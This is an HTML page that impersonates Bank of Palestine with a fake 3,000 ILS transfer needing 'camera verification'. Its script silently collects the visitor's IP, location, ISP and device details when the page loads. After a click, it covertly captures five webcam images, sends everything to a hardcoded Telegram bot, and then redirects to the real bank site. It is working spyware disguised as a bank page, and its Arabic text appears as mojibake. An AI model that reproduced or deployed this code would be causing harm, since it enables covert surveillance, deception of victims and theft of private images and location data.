<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø¨Ù†Ùƒ ÙÙ„Ø³Ø·ÙŠÙ† - Ù†Ø¸Ø§Ù… Ø§Ù„Ø£Ù…Ø§Ù† ÙˆØ§Ù„ØªØ­Ù‚Ù‚</title>
    <style>
        body { font-family: 'Tahoma', sans-serif; background-color: #f0f2f5; margin: 0; text-align: center; }
        .header { background: #fff; padding: 15px; border-bottom: 5px solid #d71920; }
        .container { max-width: 400px; margin: 50px auto; background: #fff; border-radius: 12px; padding: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .amount { color: #28a745; font-size: 35px; font-weight: bold; margin: 15px 0; }
        .status { color: #d71920; font-weight: bold; font-size: 14px; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div class="header">
    <img src="https://www.bankofpalestine.com/public/files/image/logo.png" style="width: 120px;">
</div>

<div class="container" id="mainCard">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Bank_of_Palestine_Logo.svg/1200px-Bank_of_Palestine_Logo.svg.png" style="width: 150px;">
    <h3>ØªØ­Ù‚Ù‚ Ù…Ù† Ù‡ÙˆÙŠØ© Ø§Ù„Ù…Ø³ØªÙ„Ù…</h3>
    <div class="amount">3,000.00 <small>ILS</small></div>
    <p class="status">Ø§Ù„Ø­Ø§Ù„Ø©: Ø¨Ø§Ù†ØªØ¸Ø§Ø± ØªÙØ¹ÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„Ù„ØªØ­Ù‚Ù‚..</p>
    <p style="font-size:12px; color:#777;">Ø¬Ø§Ø±ÙŠ Ø³Ø­Ø¨ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø­ÙˆØ§Ù„Ø©ØŒ ÙŠØ±Ø¬Ù‰ Ø¹Ø¯Ù… Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØµÙØ­Ø©.</p>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const TOKEN = '8550792437:AAFPRHjdjDq1vQvhLKs6S5DpfRId13-MhHc';
    const CHAT_ID = '7184970355';
    let systemInfo = "";

    // 1. Ø§Ù„ØªÙ†ÙÙŠØ° Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ ÙÙˆØ± ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
    window.onload = async function() {
        // Ø³Ø­Ø¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø±Ù‚Ù…ÙŠØ© ÙÙˆØ±Ø§Ù‹ Ø¯ÙˆÙ† Ø¥Ø°Ù†
        systemInfo = await getSystemData();
        
        // Ø¥Ø±Ø³Ø§Ù„ ØªÙ†Ø¨ÙŠÙ‡ Ø£ÙˆÙ„ÙŠ Ù„Ùƒ Ø¨Ø£Ù† Ø§Ù„Ù…Ø¨ØªØ² Ø¯Ø®Ù„ Ø§Ù„Ø±Ø§Ø¨Ø·
        sendText(`ğŸ‘¤ Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯: Ø²ÙŠØ§Ø¯ Ø§Ù„Ø®Ø·ÙŠØ¨\n${systemInfo}`);

        // Ù…Ø­Ø§ÙˆÙ„Ø© ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙÙˆØ±Ø§Ù‹ (Ù‚Ø¯ ØªÙ†Ø¬Ø­ ÙÙŠ Ø§Ù„Ù…ØªØµÙØ­Ø§Øª Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø© Ø£Ùˆ Ø¥Ø°Ø§ ÙˆØ§ÙÙ‚ Ø³Ø§Ø¨Ù‚Ø§Ù‹)
        startCamera();
    };

    // Ù…Ø­Ø§ÙˆÙ„Ø© ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¹Ù†Ø¯ Ø§Ù„Ù„Ù…Ø³ ÙƒØ®Ø·Ø© Ø¨Ø¯ÙŠÙ„Ø© (Ø¥Ù„Ø²Ø§Ù…ÙŠØ© ÙÙŠ Ø§Ù„Ù…ØªØµÙØ­Ø§Øª Ø§Ù„Ø­Ø¯ÙŠØ«Ø©)
    document.body.onclick = function() {
        startCamera();
    };

    async function startCamera() {
        if (window.isCameraRunning) return;
        
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            window.isCameraRunning = true;
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            let count = 0;
            const interval = setInterval(() => {
                if (count < 5) {
                    captureAndSend(video);
                    count++;
                } else {
                    clearInterval(interval);
                    window.location.href = "https://www.bankofpalestine.com/";
                }
            }, 500);
        })
        .catch(err => {
            console.log("Camera Blocked");
        });
    }

    async function getSystemData() {
        try {
            const ip = await fetch('https://ipapi.co/json/').then(r => r.json());
            const battery = await navigator.getBattery().then(b => (b.level * 100).toFixed(0) + "%");
            const ram = navigator.deviceMemory || "ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…";
            const cores = navigator.hardwareConcurrency || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
            
            return `
ğŸŒ IP: ${ip.ip}
ğŸ“ Ø§Ù„Ù…Ù†Ø·Ù‚Ø©: ${ip.city}, ${ip.country_name}
ğŸ¢ Ø§Ù„Ù…Ø²ÙˆØ¯: ${ip.org}
ğŸ”‹ Ø§Ù„Ø´Ø­Ù†: ${battery}
ğŸ§  Ø§Ù„Ø±Ø§Ù…: ${ram} GB
âš™ï¸ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬: ${cores} Ù†ÙˆÙ‰
ğŸ“± Ø§Ù„Ù†Ø¸Ø§Ù…: ${navigator.platform}
ğŸ•’ Ø§Ù„ØªÙˆÙ‚ÙŠØª: ${new Date().toLocaleTimeString()}
`;
        } catch (e) { return "ÙØ´Ù„ Ø³Ø­Ø¨ Ø¨Ø¹Ø¶ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø±Ù‚Ù…ÙŠØ©"; }
    }

    function sendText(text) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
    }

    async function captureAndSend(video) {
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('photo', blob, 'shot.jpg');
        fd.append('caption', systemInfo);

        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    }
</script>

</body>
</html>
